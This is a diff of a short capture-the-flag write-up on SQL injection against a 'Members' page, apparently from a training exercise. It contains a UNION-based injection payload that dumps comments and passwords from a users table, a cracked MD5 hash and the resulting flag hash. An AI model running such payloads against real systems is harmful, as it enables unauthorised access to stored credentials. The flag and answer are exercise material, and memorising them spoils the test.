@@ -1,6 +1,6 @@
 # SQL Injection - Members
 
-10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
+`10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`
 
 ---
 
@@ -16,7 +16,7 @@ submit :
 then \
 `1 AND 1=2 UNION SELECT Commentaire, countersign FROM Member_Sql_Injection.users`
 
-"Decrypt this password -> then lower all the char. Sh256 on it and it's good !" \
+"Decrypt this password -> then lower all the char. Sh256 on it and it's good !"
 
 password => 5ff9d0165b4f92b14994e5c685cdce28 => FortyTwo
 
